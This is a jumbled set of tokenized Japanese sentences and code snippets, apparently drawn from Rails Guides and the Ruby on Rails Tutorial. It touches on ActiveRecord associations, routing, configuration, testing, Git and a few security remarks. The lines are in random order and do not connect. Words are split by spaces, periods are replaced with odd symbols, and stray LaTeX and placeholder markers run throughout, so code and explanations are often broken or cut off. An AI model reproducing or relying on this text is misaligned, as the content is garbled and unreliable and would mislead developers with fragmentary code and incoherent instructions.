` beginning _ of_month ` メソッド と ` end _of_month ` メソッド は 、 それぞれ 月 の 最初 の 日付 と 月 の 最後 の 日付 を 返 し ま す 。
この コード は 動 き ま す が 、 Rails の 流儀 に 合 っ て い ま せ ん 。
*  `edit _ geocoder_ path ` は `/ geocoder/edit ` を 返 し ま す
  # ▖▖▖▖▖▖
\ kode {user } に 紐付 い た 新し い Micropost オブジェクト を 返 す
  => " test "
アプリケーション で HTML の 断片 を サニ タイズ する 方法 に 新し い 選択 肢 が 1 つ 増え ま し た 。
この コード が 動作 する の は 、 Rails に よ る Ruby の 拡張 が Rails コンソール に よ っ て 自動 的 に 反映 さ れ る から で す 。
Gravatar は 無料 の サービス で 、 プロファイル 写真 を アップロード し て 、 指定 し た メール アドレス と 関連 付け る こと が でき ま す 。
  end
\ kode {@user ▖microposts▖build } の よう な コード を 使 う ため に は 、   User モデル と Micropost モデル を それぞれ 更新 し て 、 関連 付け る 必要 が あ り ま す 。
following - users
use   ActionDispatch : : DebugExceptions
しかし 、 この 章 が 終わ る まで に は 、 ユーザー 情報 の 検証 、 保存 、 取得 が でき る 極めて 強力 な システム を 作成 し ま す 。
この 点 に つ い て は 、 もう 一 つ の 有名 な オープン ソース バージョン 管理 システム で あ る Subversion と は はっきり 異な り ま す 。
{ 0 } 図 2 ▖ 13 { / 0 }   { 1 } マイクロ ポスト の index ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts}{/microposts}) { / 1 }
環境 を 整え る ため に テスト 環境 用 データベース を 作成 する コマンド を 実行 する の は これ が 初めて で す 。
# => { name : [ " 空欄 に は でき ま せ ん " ] }
詳細 に つ い て は 、 [ Action   Mailer ガイド ] ( http://guides▖ rubyonrails ▖org/action _mailer_ basics▖html # action - mailer- configuration ) を 参照 し て くださ い 。
*  `config▖ log_tags` は 、 ` request ` オブジェクト が 応答 する メソッド の リスト を 引数 に 取 り ま す 。
デフォルト は ` - i  - t`▟</ li ></ul> |
#### ` singularize`
` config/ database▖yml ` に は ERB を 記述 でき る の で 、 database▖yml 内 で 明示 的 に ` ENV [ ' DATABASE _ URL '] ` を 使用 する の が 最善 の 方法 で す 。
ここ で スクリプト の 正味 の 部分 ( ペイロード ) は style 属性 に 置 か れ ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ range /overlaps▖rb ` で す 。
    has _one   : account ,  -> {  w here   " confirmed  =   1 "   }
{ 0 } 図 10 ▖ 13 { / 0 } { 1 }   ( プロト) フィード の あ る ホーム ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/proto _feed_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
     super
また 、 以下 の 行 に も 注目 し て くださ い 。
I18n ▖ locale  = : de
制限 を ラムダ と し て 指定 する こと も でき ま す 。
* `: restrict_with _error ` を 指定 する と 、 関連 付け られ た オブジェクト が 1 つ で も あ る 場合 に エラー が オーナー に 追加 さ れ ま す 。
   self ▖ primary _key =  " product _ id "
README ▖ rdoc     |   243   --------------------------------------------------
一括 kill を 行 う に は 、 最初 に \ texttt { spring } コマンド その もの で プロセス を 停止 し て お く 必要 が あ り ま す 。
#   ユーザー を サイン イン さ せ 、 ユーザー ページ   ( show )   に リダイレクト する 。
アセット は 引き続 き ` public ` ディレクトリ 以下 に 置 く こと も 可能 で す 。
╼ and   to   permit   persons  to   whom  the   Software   is   furnished to   do  so ,
しかも 、 上 の 記法 は 実装 に 密着 し て い る の で 、 実装 が 変更 さ れ た ら それ ら も すべて 変更 が 必要 に な り ま す 。
送 っ て いただ い た 機能 追加 を メンテナンス 用 ブランチ に 押し込め て お しま い 、 と い う よう な こと は し て い ま せ ん 。
I   shall  be   late ! " ▖ truncate ( 18 , separator :  ' ')
    ▖▖▖
これ で は DRY と は 言え ま せ ん 。
self を 省略 し た 結果 を リスト \ ref{ code : basic _ signup_tests } に 示 し ま す 。
エンジン を テスト する ため に 、 ` test/dummy ` ディレクトリ に 埋め込 ま れ た 縮小 版 の Rails アプリケーション が 用意 さ れ ま す 。
しかし 今 で は 、 Web 開発 者 が 認証 システム と い う もの を 以前 より も 深 く 理解 する よう に な り 、 最新 の Rails に は 認証 システム も 同梱 さ れ る よう に な り ま し た 。
HTTP  request メソッド の 詳細 に つ い て は \ ref{ sec : TDD } で 説明 し ま す 。
以前 の バージョン で は 、 モデル で ` default _scope ` を 定義 する と 、 同じ フィールド で 連鎖 し た 条件 に よ っ て オーバーライド さ れ ま し た 。
{ 0 } 表 8 ▖ 1 { / 0 }   { 1 } リスト \ ref{ code :sessions _ resource} { / 1 } の セッション ルール に よ っ て 提供 さ れ る ルーティング
$   ARCONN = sqlite 3   ruby   - Itest   test/ cases/associations/has_many_ associations_test ▖ rb
####  CSS と Sass
#   バルセロナ で は 夏 時間 に よ り 2010 / 03 / 28   0 2 : 0 0   + 0 100 が 2010 / 03 / 28   0 3 : 0 0   + 0200 に な る
scaffold の 自動 生成 コード に 頼 っ て い る 限り 、 コード 自動 生成 の 達人 に は なれ る か も しれ ま せ ん が 、 Rails に 関 する 実践 的 な 知識 は ほとんど 身 に 付 き ま せ ん 。
  else
以下 の 例 で 説明 し ま す 。
{ 0 } 図 11 ▖ 2 { / 0 }   { 1 } Micropost と その User は \ kode {belongs_to}   ( 1 対 1 )   の 関係 性 が あ る { / 1 }
self を 省略 し た 結果 を リスト \ ref{ code :unicorn_gemfile } に 示 し ま す 。
    < head >
本書 で は 、 Ruby   1 ▖ 9 ▖ 3 また は 2 ▖ 0 ▖ 0 を 前提 と し ま す が 、 Ruby   1 ▖ 9 ▖ 2 で も 動作 する はず で す 。
` : root ` オプション を 使用 する こと で 一貫 し た ルート 要素 を 使用 する こと も でき ま す 。
データベース 上 に サンプル ユーザー を 生成 する Rake タスク
*   テスト を 書 く こと ▟ 自分 の コード が な い と 失敗 し 、 ある と 成功 する テスト で あ る こと 。
ユーザー 一覧 を 実装 する とき も   ( \ ref{ sec : updating_ and_ deleting _ users_ conclusion } ) 、 似 た よう な 問題 に ぶつか り ま し た 。
{ 0 } { 1 } 第 2 章 { / 1 } { / 0 } で は 、 Rails アプリケーション の 基本 的 な 仕組み を 体験 する ため に 、 別 の プロジェクト を 作成 し ま す 。
関連 付け で は 、 常 に 逆 関連 付け を 自動 的 に 検出 し よう と し ま す ▟ その 際 、 関連 付け 名 に 基 い て ` : inverse _of ` オプション が ヒューリスティック に 設定 さ れ ま す 。
それ が オープン ソース と い う もの で す 。
╼/ log/*▖ log ╼/tmp╼╼#  Ignore   Spring   files ▖
( 実際 、 既に \ kode { alert- danger } と い う CSS クラス を 使 っ て 、 リスト \ ref{ code :errors_ partial } の エラー メッセージ の スタイル を div タグ で 指定 し て い ま す ▟ )
よく 使用 さ れ る データベース 接続 方法 の 詳細 な 例 に つ い て は 、 次 で 説明 し ま す 。
データベース に インデックス を 追加 する こと で 検索 効率 が 向上 する ▟ また 、 データベース レベル で の 一意 性 を 保証 する ため に も 使 わ れ る
最初 に タイトル の テスト を 作成 し 、 次 に タイトル を 追加 し 、 最後 に \emph { レイアウト } ファイル を 使 っ て リファクタリング と 重複 の 排除 を 行 い ま す 。
RVM を フィルタ する backtrace   silencer を 追加 する
( システム 環境 に よ っ て は 、 ここ で Rails を 再 起動 する 必要 が あ る か も しれ ま せ ん ) 。
Users コントローラ の 骨格
|` delivery _ method ` | 配信 方法 を 指定 し ま す 。
リスト { p 2 } の { 4 } create { / 4 } で 最初 に 失敗 し た ログ イン
<% = stylesheet_link_tag   " application " ,   media :   " all " ,   " data-turbolinks - track "  => true   %>
いったん オブジェクト を 作成 すれ ば 、 今度 は 何 度 で も 更新 し た く な る もの で す 。
続け て サイン イン を 行 っ た 後 、 転送 先 の URL は デフォルト   ( ユーザー プロファイル ページ )   に 戻 る 必要 も あ り ま す の で 、 これ も テスト で 確認 し て くださ い 。
###  Rack アプリケーション に ルーティング する
ここ で 必要 な の は 、 \ kode {microposts } テーブル から 、 ある ユーザー   ( つまり 自分 自身 )   が フォロー し て い る ユーザー に 対応 する id を 持 つ マイクロ ポスト を すべて 選択   ( select )   する こと で す 。
ここ で 、 既存 の 顧客 の ため に 新し い 注文 を 1 つ 追加 し た く な っ た と し ま す 。
文字 列 の よう な オブジェクト は 、 たとえば \ kode {length } と い う メッセージ に 応答 でき ま す が 、 これ は 文字 列 の 文字 数 を 返 し ま す 。
ここ で は 、 最後 の 永続 モデル を 採用 する こと に し ま す ▟ ユーザー が サイン イン する と 、 ユーザー が 明示 的 に サイン アウト する まで サイン イン の 状態 を 永続 さ せ ま す
@ patient  =   Patient ▖find ( 17 )
すべて の 要素 が ` to _xml ` に 応答 する 必要 が あ り ま す ▟ そう で な い 場合 は 例外 が 発生 し ま す 。
驚 い た こと に 公式 標準 に よ る と 、 たとえば \ kode { " Michael   Hartl " example ▖ com } の よう な クォート と スペース を 使用 し た メール アドレス も 有効 な の だ そう で す 。
クラウド 開発 環境 を 利用 する ため の 手順 は 次 の とおり で す 。
実際 、 Rails で あえて 静的 な ページ を 使用 し て お い て 、 後 から \emph { ほんの 少し } 動的 な コンテンツ を 追加 する こと も でき ま す 。
</ small>
{ 0 } 図 11 ▖ 7 { / 0 }   { 1 } ユーザー プロフィール   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 }{ / users / 1 } )   と マイクロ ポスト { / 1 }
now ▖utc                # =>  Mon ,   0 7   Jun  2010   23 : 27 : 52   + 0000
     create_table  : appointments  do  | t |
上 の コード の うち 、 サンプル リレーションシップ を 作成 する 部分 は 以下 で す 。
     following
### `include ?
`find_ by ` メソッド は 、 与え られ た 条件 に マッチ する レコード の うち 最初 の レコード だけ を 返 し ま す 。
マッチ する HTML
User モデル と Micropost モデル の 継承 階層
Rails に デフォルト で 備わ っ て い る 環境 は 、 " development " 、 " test " 、 " production " の 3 つ で す 。
` last ` メソッド は 、 主 キー 順 の 最後 の レコード を 取り出 し ま す 。
date  =  Date▖ new (2010 ,   6 ,   6 )
     This   command   does such   and   such ▖
### `errors`
素晴らし い 正規 表現 エディタ \ href { http://www ▖rubular▖ com/}{ Rubular }
    @ comment  = @ article ▖ comments▖find ( params [ : id ] )
   belongs_to : continent
ユーザー 登録 フォーム の とき と 同様 に 、 サイン インフォーム で も Capybara を 使 っ て フォーム に 値 を 入力 し 、 ボタン を クリック する テスト を 行 う こと が でき ま す 。
gem 'blorgh ' ,   path:   " vendor/engines/blorgh "
無効 な ユーザー 登録 に 対 する テスト
マイクロ ポスト 作成 フォーム を 構築 する ため に 、 サイト 訪問 者 が ログ イン し て い る か どう か に 応じ て 異な る HTML を 提供 する コード を 使用 し ま す   ( リスト \ ref{ code :microposts_ home_ page } ) 。
マニフェスト の デフォルト の 置き 場所 は 、 ` config ▖ assets▖ prefix ` で 指定 さ れ た 場所 の ルート ディレクトリ   ( デフォルト で は '/assets')   で す 。
属性 の 値 が どの よう な もの で あ っ て も オブジェクト が 無効 で あ る こと を 通知 し た い 場合 に この メソッド を 使用 でき ま す 。
同様 に \ kode {rake } など も 以下 の よう に 実行 でき ま す 。
` has_and _belongs_to_many ` 関連 付け を 作成 し た 場合 は 、 それ に 対応 する 結合 ( join ) テーブル を 明示 的 に 作成 する 必要 が あ り ま す 。
class   CreateAccountHistories <  ActiveRecord : : Migration
` < 属性 名 > ` は 、 アクセス し よう と し た 属性 で す 。
以下 の 変更 は 、 Rails   3 ▖ 1 ▖ x の 最新 版 で あ る Rails   3 ▖ 1 ▖ 12 に アップグレード する ため の もの で す 。
test 環境 と development 環境 で の デフォルト は ` : log ` で あ り 、 それ 以外 の 環境 で は ` false ` が 設定 さ れ ま す 。
ユーザー 定義 の タイム ゾーン を 考慮 する メソッド を 使用 し て 日付 を 比較 し た い 場合 、 ` Time▖now ` で は な く 必ず ` Time▖ current ` を 使用 し て くださ い 。
     別 の こと を する
同様 に 、 ` app/views/articles/show ▖html ▖erb ` テンプレート に も Edit リンク を 追加 し ま しょ う ▟ こう し て お け ば 各 記事 の ページ から 編集 を 行え る よう に な り ま す 。
< / head >
scope   shallow_ path:  " sekret "   do
* ` ActionDispatch : : Callbacks▖ to_prepare ` に は 、 リクエスト より 前 かつ ` ActionDispatch : : Callbacks▖ before ` より 後 に 実行 し た い コード ブロック を 1 つ 引数 と し て 与え ま す 。
rest   =   hash▖slice ! (:a)  # => {: b = > 2 }
resources   : photos,  : accounts
*   動的 検索 メソッド を 使用 する
したが っ て 、 データ モデル は 図 \ ref { fig :user_ has_many _ followers } の よう に な り ま す 。
本番 環境 で の 効率 性
続 い て 、 ` app/views/articles/edit▖html ▖erb ` ビュー で も 同じ 作業 を 行 い ま す 。
それ に は まず 、 ドル 記号   ( $)   と CSS   id を 使用 し て DOM 要素 に アクセス する 文法 に つ い て 知 る 必要 が あ り ま す 。
class   Category  <  ActiveRecord : : Base
Rack は 、 Ruby の ウェブ アプリケーション に 対 し て 、 最小 限 で モジュール 化 さ れ て い て 、 応用 の 効 く インターフェイス を 提供 し ま す 。
これ で ブログ エンジン の コメント 機能 が でき ま し た 。
$  cd   activerecord
`:builder ` オブション を 使用 する こと で 、 独自 の ビルダ を 構成 でき ま す 。
SELECT  *  FROM   clients  LIMIT   10
time_zone_select (   " user " ,  " time_zone " )
------------------
Micropost モデル に アップ ローダー を 追加 し た 結果 を リスト \ ref{ code :micropost _model_ picture } に 示 し ま す 。
しかし 、 bcrypt の ハッシュ は 復号 化 でき な い はず な の で 、 復号 化 し て い る はず は あ り ま せ ん 。
#    location :  '/ usr/sbin/sendmail ' ,
class   B  <  C ; end
まず 、 サンプル アプリケーション の ログ インフォーム に 「 forgot   password 」 リンク を 追加 し ま す   ( 図 \ ref { fig: login_forgot_ password _mockup } ) 。
end _of_quarter   ( at_end _of_quarter )
上 の コード の `_ad_banner▖html ▖erb ` パーシャル と `_ footer ▖html ▖erb ` パーシャル に 含 ま れ る コンテンツ は 、 アプリケーション の 多く の ページ と 共有 でき ま す 。
bytes
self を 省略 し た 結果 を リスト \ ref{ code : generate_user_mailer } に 示 し ま す 。
この 時点 で は 、 \emph { ルーティング } は 動作 し て い ま す が 、 対応 する ページ が 動作 し て い る と は 限 り ま せ ん 。
  >>   1 ▖ year ▖ from _now
この 場合 は 以下 の よう に し ま す 。
`tmp/cache ` ディレクトリ が 存在 する 場合 の デフォルト は ` : file_store ` に 設定 さ れ 、 それ 以外 の 場合 の デフォルト は ` : memory _ store ` に 設定 さ れ ま す 。
アプリケーション に カスタム CSS を 追加 する ため の 第 一 段階 と し て 、 カスタム CSS を 格納 する ため の 以下 の ファイル を 開 き ま す 。
ちなみ に Ruby   2 ▖ 1 ▖ 5 の インストール に も 苦戦 し ま し た 。
エンジン の コントローラ は デフォルト で ` Blorgh : : Application Controller ` を 継承 し ま す 。
get  ' こんにちは ' ,  controller :  'welcome',   action :  'index'
< a   href = " # "   onclick = " this ▖style▖ backgroundColor = '# 990000 ' " > Paint  it   red </a>
ページ の 内容 は 以下 の とおり で す 。
論理 上 、 他 の リソース の 配下 に 子 リソース を 配置 する こと は よく あ り ま す 。
\ ref{ sec :unsuccessful_edits } で は 編集 フォーム の 失敗 時 を 実装 し ま し た 。
= > [ " foo " ,   " bar " ,   " baz " ]
` Date▖ beginning _ of _week ` また は ` config▖ beginning _ of _week ` が 設定 さ れ て い れ ば 、 ` next _ week ` と ` prev _week ` は どちら も 正常 に 動作 し ま す 。
上 の よう に する こと で 、 以下 の よう な ` Categories ` コントローラ へ の ルーティング が 作成 さ れ ま す 。
< % end   %>
もちろん 、 これ ら の レッスン は すべて 通常 の Java Script に も 適用 でき ま す 。
まず は いつ も の よう に 、 統合 テスト を 生成 する ところ から 始め ま す 。
` has_and _belongs_to_many ` 関連 付け に オブジェクト を アサイン し 、 しかも その オブジェクト を 保存 し た く な い 場合 、 ` collection▖build ` メソッド を 使用 し て くださ い 。
例 ：
\ kode {: name } と \ kode {:email } 属性 の テスト 。
#### `app ` ディレクトリ
具体 的 に は 、 \ kode { get }   と 書 か れ て い る ため 、 \ texttt { GET }   リクエスト に 対 し て 該当 する アクション を 結びつけ て い ま す 。
Sublime  Text を 再 起動 する と 、 以下 の よう な コマンド が RubyTest パッケージ に よ っ て 提供 さ れ ま す 。
既に \ ref{ sec : bitbucket } で 一 度 プッシュ を 行 っ た の で 、 大抵 の システム で は \ kode { git   push } を 実行 する とき に \ kode {origin  master } を 省略 でき ま す 。
{ 0 } 図 12 ▖ 5 { / 0 }   { 1 } Home ページ に ステータス フィード が 表示 さ れ 、 フォロー の カウント が 1 増え た { / 1 }
\emph { URI } は Uniform   Resource   Identifier の 略 で す ▟ それ より やや 一般 性 の 低 い \emph { URL } は Uniform   Resource   Locator の 略 で す 。
\ kode {user ▖microposts▖build ( ▖▖▖) } と い う コード は 、 引数 で 与え た ユーザー に 関連 付け さ れ た マイクロ ポスト を 返 す
\ kode { has\_many : through } を 使 う と 、 複雑 な データ 関係 を モデリング でき る
関連 付け られ た オブジェクト に も 自分 の ` errors ` コレクション が 含 ま れ る の で 、 エラー は 呼び出 し 元 の モデル まで は 伝わ り ま せ ん 。
最初 に マッチ し た の が 以下 の ルーティング だ と し ま す 。
foo  : bar
サイクル の 記念 す べ き 第 一 歩 は About ページ 用 の 失敗 する テスト を 書 く こと で す 。
        route     resources   : users
ただし 攻撃 者 は Web サーバー の アクセス ログ ファイル を 調べ て 標的 ユーザー の cookie を 参照 する こと が でき ま す 。
続 い て その テスト を 実行 し て 「 失敗 」 する こと を 確認 し 、 実際 の アプリケーション コード を 書 き ま す 。
#### `take `
*  ` customers/_customer▖html ▖erb `
format ブロック 内 で ren der メソッド 呼び出し に ` layout :  'layout_ name '` オプション を 渡 す こと で 、 フォーマット ごと に 異な る レイアウト を 指定 する こと も でき ま す 。
no  changes   added to  commit   ( use   " git   add "   and /or   " git  commit   - a " )
TIP :   詳細 に つ い て は 、 production 環境 用 Web サーバー の ドキュメント を 参照 し て くださ い 。
これ は 、 管理 者 が システム から ユーザー を 削除 し た とき 、 持ち主 の 存在 し な い マイクロ ポスト が データベース に 取り残 さ れ て しま う 問題 を 防ぎ ま す 。
リスト \ ref{ code : layout_links_test } で 追加 し た 統合 テスト が 通 る か どう か は 、 次 の よう に Rake タスク を 実行 する こと で 試 す こと が でき ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/ delegation ▖rb ` で す 。
( Sass は \ ref{ sec : sass } まで 登場 し ま せ ん が 、 \ texttt { bootstrap - sass }   gem が 動作 する ため の お まじない と し て 必要 で す ) 。
" dude " ▖ pluralize ( 2 )  # => " dudes "
###  パッチ を テスト する
マイクロ ポスト の 作成 に 失敗 し た 場合 の エラー メッセージ
以上 の 情報 を 元 に 、 Postgre SQL を 使用 し て 開発 データベース と テスト データベース を 作成 し 、 それぞれ 設定 を 行 う こと が 、 この 課題 の ゴール で す 。
これ に よ り 、 ` config ▖ assets▖ prefix ` で 指定 さ れ た フォルダ が ` shared/assets ` に リンク さ れ ま す 。
` BigDecimal ` の 拡張
次 の メソッド を 使用 する と 、 ミドルウェアスタック に 新し い ミドルウェア を 追加 する こと が でき ま す 。
Mac   OS   X や Windows に は Java Script ラン タイム が 同梱 さ れ て い ま す 。
#   Defines  the  matching   rules   for   Guard ▖
self を 省略 し た 結果 を リスト \ ref{ code : curl_rails_png } に 示 し ま す 。
正規 表現 の 終わり を 示 す
サーバー と CD N の 設定 完了 後 、 以下 の アセット を 持 つ Web ページ に アクセス し た と し ま す 。
\ kode {save } メソッド を 実行 し た 後 に 何 が 変更 さ れ た の か を 確認 し て み ま しょ う 。
レイアウト の リンク を テスト する 統合 テスト が 追加 さ れ た こと で 、 リンク に 間違 っ た 変更 が 加え られ た ら すぐ に 気付け る よう に な り ま し た 。
一方 、 \ kode {cookies } メソッド   ( \ ref{ sec : remember_me})   の 場合 は 、 \ kode {session } メソッド で 作成 さ れ た 一時 cookies は 、 ブラウザ を 閉じ た 瞬間 に 有効 期限 が 終了 し ま す 。
head   : created ,   location :   photo _ path( @photo)
exabytes
これ は ライブラリ に お い て は 特に 重要 な 問題 で す 。
Rails   2 ▖ 1 ▖ 2 で は これ ら の 文字 を ` redirect_to ` メソッド の Location フィールド から エスケープ する よう に な り ま し た 。
( この コード の テスト は \ ref{ sec : exercises_friendly _ forwarding } の 演習 と し ま す ) 。
Toy アプリケーション 用 の \ kode { Gemfile }
#   If  you' re   not   u sing   ActiveRecord ,  or   you'd   prefer  not   to   run  each   of
この コマンド を 実行 する と 、 先ほど 定義 し た ユーザー と マイクロ ポスト の データ モデル を 使 っ て 、 Heroku 上 の データベース が 更新 さ れ ま す 。
Active   Record を 使用 する こと で 、 SQL を 直 に 実行 する 必要 は ほぼ な く な り ま す 。
2 ▖ordinal     # => "nd "
#   Ignore  bun dler  config▖
デフォルト の ミドルウェア ( と その 他 の うち いく つ か ) に つ い て は   [ Internal  Middlewares ] ( # ミドルウェアスタック の 内容 )   を 参照 し て くださ い 。
now ▖ change ( min :   0 )
これ から 5 つ の 章 を 通 し て 、 ユーザー 登録 ページ を 作 っ て い く こと に し ま しょ う 。
sign _out
ここ で は \ kode {to } メソッド を 使用 し て 、 正し い データ を 与え て ユーザー 登録 ボタン を 押 し た とき に カウント が 1 つ \emph { 増え る } こと を 確認 し ま す 。
変更 が 特定 の issue に 関連 する 場合 は 、 issue 番号 も 記入 し て くださ い 。
この テスト は 最初 の メール アドレス の 重複 テスト と 同じ こと を し て い ま す が 、 大 文字 に 変換 し た メール アドレス を 使 っ て い る 点 が 異な り ま す 。
サンプル アプリケーション の 他 の 機能 と 同様 、 User モデル へ の 検証 の 追加 も テスト 駆動 開発   ( TDD )   で 行 い ま す 。
### `strip_ heredoc`
person ▖errors▖ size # = >   2
新し い ターミナル タブ を 開 く 。
また 、 最初 に 無効 な パスワード 、 次 に 有効 な パスワード を 与え る こと で \ kode {authenticate } の 動作 を 確認 する こと も でき ま す 。
Time▖ local ( 2000 ,   10 ,   31 ) ▖ prev_quarter  # =>  Mon ,   30   Oct  2000
REpresentational   State   Transfer   ( REST )
    has_many  : orders ,  -> { order   " date_confirmed   DESC "   }
話 を 戻 し て 、 Bootstrap の 変数 の 一覧 表 を 見 る と 、 薄 い 灰色 に 対 し て 以下 の 変数 名 が 与え られ る こと に 気 が 付 き ま す 。
The  \ kode { current_user ? }  
Client ▖ w here ( first _ name :  ' does  not  exist ') ▖take !
リレーションシップ の 作成 と 属性 を テスト する 。
でき る かぎり 、 データベース の 内部 エンコード は UTF - 8 に し て お い て くださ い 。
              PUT     /articles/: id ( ▖: format )        articles #update
Date▖ new (2000 ,   5 ,   31 ) ▖ next _ month # =>  Fri ,   30   Jun  2000
>> p =   Person ▖ create
####  コレクション パーシャル レイアウト
この 攻撃 は 2006 年 6 月 11 日 に 行 わ れ た もの で 、 Web メール インターフェイス を 使用 する ワーム の 最初 の 事例 で す 。
*  ` action_controller▖initialize_framework _ caches`: ` Rails ▖ cache ` に 対 する 設定 が 行 わ れ て い な い 場合 に ` Action Controller : : Base ▖ cache_store ` を 設定 し ま す 。
*  `config▖ action_view▖field_error _proc ` は 、 Active   Record で 発生 し た エラー の 表示 に 使用 する HTML ジェネレータ を 指定 し ま す 。
\ ref{ sec :user_ validations } と 同様 で 、 リスト \ ref{ code :micropost _validations_tests } で は マイクロ ポスト の 長 さ を テスト する ため に 、 文字 列 の 乗算 を 使用 し て い ま す 。
作成 し た コード を リスト \ ref{ code :user_ model_activation_code } に 示 し ま す
\emph { Ruby   on   Rails チュートリアル } 第 3 版 で は 、 Rails を 学び やす く する ため に さまざま な 工夫 を こら し ま し た 。
この 方 が 、 コード の 重複 を 一括 で 取り除け る から で す 。
    ren der   action :   " regular_ show "
\ href { http://rack ▖ rubyforge▖org / doc/}{ Rack ミドルウェア } 用 の 設定 ファイル
TIP: `: foreign_key ` オプション および ` : association_foreign_key ` オプション は 、 多 対 多 の 自己 結合 を 行 い た い とき に 便利 で す 。
オプション に つ い て は 、 1 つ 上 の [ 計算 ] ( # 計算 ) セクション を 参照 し て くださ い 。
この 後 に も 続々 同じ よう な 動画 が 作 ら れ て い ま す が 、 いずれ も Rails の 能力 の 一端 を 垣間見 る に は うってつけ な の で 、 ぜひ 一 度 ご覧 くださ い 。
sting } ╼╼\ subsection { 本番 環境 で の 画像 アップロード } %  ( fold) ╼\ label{ sec : image_upload _ in_production}╼╼
" M : : X " ▖ constantize # = >   1
前章 同様 に 、 トピック ブランチ で 作業 し て から 、 最後 に 更新 を マージ し ま す 。
以下 の よう な コード の 書 き 方 を 強 く 推奨 し ま す 。
NOTE : ` ActionDispatch : :MiddlewareStack ` は ` Rack : :Builder ` の Rails 版 で す が 、 Rails アプリケーション の 要求 を 満た す ため に 、 より 柔軟 性 が あ り 、 多 機能 な クラス に な っ て い ま す 。
    <% @ article ▖errors▖ full _messages ▖each   do  | msg | %>
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/ compact ▖ rb ` で す 。
date_field ( " user " ,   " dob " )
          end
本 サイト に ユーザー 登録 いただ き ありがとう ござ い ま す 。
    @x , @y   =   x ,  y
| public /| この フォルダ の 下 に あ る ファイル は 外部   ( インターネット )   から その まま 参照 でき ま す 。
インター セプタ が 動作 する よう に する に は 、 Action   Mailer フレームワーク に 登録 する 必要 が あ り ま す 。
" invoice _ lines " ▖ classify # => " Invoice Line "
#### index ファイル を 使用 する
Microposts リソース の 説明 が 終わ り ま し た の で 、 ここ で リポジトリ を GitHub に 登録 し ま しょ う 。
この メソッド に は ` : remote ` オプション が あ り 、 以下 の よう に 使用 でき ま す 。
    resources   : photos,  : accounts
# => {" "  => nil ,   " A "  => : a ,   " 1 "   = >   1 }
NOTE :   この リソース へ の パス を 生成 する に は ` photos_ path ` や ` new_ photo _ path ` など を 使用 し て くださ い 。
<%=   link_to  'Edit   Ad ' ,  [ :edit ,  @magazine ,  @ad ]  %>
+ ---- +------------- +---------- +------ +--------------- +
セッション 関連 の ミドルウェア を 削除 し た い とき は 次 の よう に 書 き ま す 。
それ 以外 の 追加 は 不要 で す 。
この 「 The   Rails   Way 」 、 「 Rails 流 」 と で も い う べ き 手法 を 学 ん だ 人 は 、 開発 の 生産 性 が 著し く 向上 する こと に 気付 く で しょ う 。
# => < input type = " url"   id= " user_url"   name = " user [ url] "   value =" #{@user ▖url} " />
123456 78 ▖ to_s(: delimited ,   delimiter : "▖ " )      
" name " ▖ dasherize         # => " name "
" Tom &   Jerry " ▖ to_ param  # =>  " Tom &   Jerry "
#   Ruby   on   Rails   チュートリアル ： サンプル アプリケーション
Rails で は 複数 の テンプレート システム が サポート さ れ て お り 、 テンプレート ファイル の 拡張 子 で 区別 さ れ ま す 。
デフォルト で は ルート ノード は " hash " で す が 、 ` : root ` オプション を 使用 し て カスタマイズ でき ま す 。
変更 を データベース に 保存 する ため に 最後 に save を 実行 する 必要 が あ る こと を 忘れ な い で くださ い 。
旧版 チュートリアル で 依存 し て い た 多く の 外部 ライブラリ   ( RSpec 、 Cucumber 、 Capybara 、 Factory   Girl )   を 廃止 し ま し た 。
ユーザー の フォロー に 対 する テスト で は 、  /relationships に 対 し て POST リクエスト を 送 り 、 フォロー さ れ た ユーザー が 1人 増え た こと を チェック し ま す ▟ 具体 的 な コード は 次 の とおり で す 。
また 、 その よう な 値 を 持 つ グループ は 、 常 に 全体 の 中 で 最後 の グループ に な り ま す 。
なお 、 以前 の バージョン で は ` HashWithIndifferentAccess ` が 使用 さ れ て い ま し た 。
ユーザー の アンフォロー する フォーム
デフォルト は false で す 。
この 時点 で は もちろん 実装 は あ り ま せ ん が 、 機能 を 確認 する ため の テスト は 作成 でき ま す 。
この 節 で は 、 レイアウト と ルーティング の 取り組み に お け る 頂点 と し て 、 ユーザー 登録 ページ へ の ルーティング を 作成 し ま す ▟ その ため に 2 番 目 の コントローラ を 作成 する こと に な り ま す 。
以下 の 情報 を 参考 に し て くださ い 。
#### `belongs_to ` の スコープ
  < small>By <%=  article ▖ author  %></small>
` content_ for ` を 呼び出 す と 、 後 の 利用 に 備え て 、 id に 対応 する マーク アップ の ブロック が 保存 さ れ ま す 。
次 に \ kode {first_app } と い う 最初 の   Rails   アプリ の 作成 に 着手 し ま す 。
現在 は 、 他 の スコープ と 同様 、 マージ さ れ る よう に な り ま し た 。
SELECT  *  FROM   clients  LIMIT   5   OFFSET   30
*   `update_attribute `
タイトル に Ruby を 埋め込 ん だ Home ページ の ビュー
  >>  Rails ▖env▖ development ?
config▖ action _mailer ▖ perform_ deliveries =  true
*  `config▖ colorize_ logging ` は 、 出力 する ログ 情報 に ANSI 色 情報 を 与え る か どう か を 指定 し ま す 。
顧客 と 注文 を 設定 する コード を 次 の よう に 書き直 し ま す 。
そこ で \ kode {before\ _create } コール バック が 必要 に な り ま す ▟ この コール バック は 以下 の よう に 定義 でき ま す 。
module   X
新規 記事 投稿 フォーム ] ( images/getting _ started/new_ article ▖ png )
{ 0 } 図 12 ▖ 16 { / 0 }   { 1 } 現在 の ユーザー に フォロー さ れ て い る ユーザー を 表示 する { / 1 }
self を 省略 し た 結果 を リスト \ ref{ code : following _ followers_authorization_test } に 示 し ま す 。
" hello " ▖ to ( 2 )    # =>  " hel "
                      foo@bar_baz▖ com  foo@bar + baz▖ com ]
たとえば 、 ひと かたまり の レコード を 取り出 し 、 それ を テーブル 内 の ` created_at ` の 昇順 で 並べ た い 場合 に は 以下 の よう に し ま す 。
* `: destroy ` を 指定 する と 、 関連 付け られ た オブジェクト も 同時 に destroy さ れ ま す 。
これ ら の アセット を 必要 と する の は 、 gem の admin レイアウト しか な い から で す 。
      t▖ string    : name
